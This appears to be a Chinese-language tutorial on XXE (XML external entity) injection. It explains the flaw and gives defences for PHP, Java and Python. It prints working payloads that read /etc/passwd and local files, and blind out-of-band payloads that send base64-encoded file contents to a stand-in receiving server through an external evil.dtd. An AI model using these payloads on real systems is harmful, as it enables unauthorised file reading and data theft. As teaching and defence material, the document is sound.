## XXE漏洞原理
XXE漏洞也叫XML外部实体注入。由于没有禁止外部实体的加载,攻击者可以加载恶意外部文件，而应用程序解析输入的XML数据时,解析了攻击者伪造的外部实体导致产生XML漏洞。

## XXE漏洞的危害
（1）读取任意文件</br>
（2）执行系统命令</br>
（3）内网端口扫描</br>
（4）攻击内网其他网站

## XXE漏洞的利用
一般xxe利用分为两大场景：有回显和无回显。有回显的情况可以直接在页面中看到payload的执行结果或现象，无回显的情况又称为blind xxe，可以使用外带数据通道提取数据。
### （一）有回显的情况
**（1）直接通过DTD外部实体声明**</br>
XML内容如下：
```
<?xml version="1.0"?>
<!DOCTYPE ANY [
<!ENTITY test SYSTEM "file:///etc/passwd">
]>
<abc>&test;</abc>
```
**（2）通过DTD文档引入外部DTD文档，再引入外部实体声明**</br>
XML内容如下：
```
<?xml version="1.0"?>
<!DOCTYPE a SYSTEM "http://localhost/evil.dtd">
<abc>&b;</abc>
evil.dtd内容：
<!ENTITY b SYSTEM "file:///etc/passwd">
```
**（3）通过DTD外部实体声明引入外部实体声明**</br>
XML内容如下:
```
<?xml version="1.0"?>
<!DOCTYPE a [
<!ENTITY % d SYSTEM "http://localhost/evil.dtd">
%d;
]>
<abc>&b;</abc>
```
evil.dtd内容：
```
<!ENTITY b SYSTEM "file:///etc/passwd">
```

### （二）无回显情况，又称blind xxe，使用外带数据通道提取数据
**（1）第一种无回显示payload**
```
<?xml version="1.0"?>
<!DOCTYPE a [
<!ENTITY % file SYSTEM "file:///c://test/1.txt">
<!ENTITY % dtd SYSTEM "http://localhost/evil.xml">
%dtd; %all;
]>
<abc>&send;</abc>
```
其中evil.xml文件内容为
```
<!ENTITY % all "<!ENTITY send SYSTEM 'http://localhost%file;'>">
```
调用过程为：参数实体dtd调用外部实体evil.xml，然后又调用参数实体all，接着调用实体send。

**（2）第二种无回显payload**
```
<?xml version="1.0"?>
<!DOCTYPE a [
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=c:/test/1.txt">
<!ENTITY % dtd SYSTEM "http://localhost/evil.xml">
%dtd;
%send;
]>
<abc></abc>
```
其中evil.xml文件内容为：
```
<!ENTITY % payload "<!ENTITY % send SYSTEM 'http://localhost/?content=%file;'>"> %payload;
```
调用过程和第一种方法类似，但最里层的嵌套里%要进行实体编码成%。无报错需要访问接受数据的服务器中的日志信息，可以看到经过base64编码过的数据，解码后便可以得到数据。</br>
这里注意参数实体引用%file;必须放在外部文件里，因为根据这条规则 。在内部DTD里，参数实体引用只能和元素同级而不能直接出现在元素声明内部，否则解析器会报错： PEReferences forbidden in internal subset。这里的internal subset指的是中括号[]内部的一系列元素声明，PEReferences 指的应该是参数实体引用 Parameter-Entity Reference 。</br>
一般都使用第二种方法，因为当文件中含有中文字符或<字符，会导致不能解析。

## XXE漏洞的防御
（1）禁用外部实体，例如ibxml_disable_entity_loader(true)；</br>
```
//在php中，引用外部实体和libxml库有关系
//libxml > 2.9 默认不解析外部实体
libxml_disable_entity_loader(true);

//java:
DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();
dbf.setExpandEntityReferences(false);

//python:
from lxml import etree
xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))
```
（2）过滤和验证用户提交的xml数据，防止出现非法内容；过滤关键词：<!DOCTYPE和<!ENTITY，或者SYSTEM和PUBLIC等。
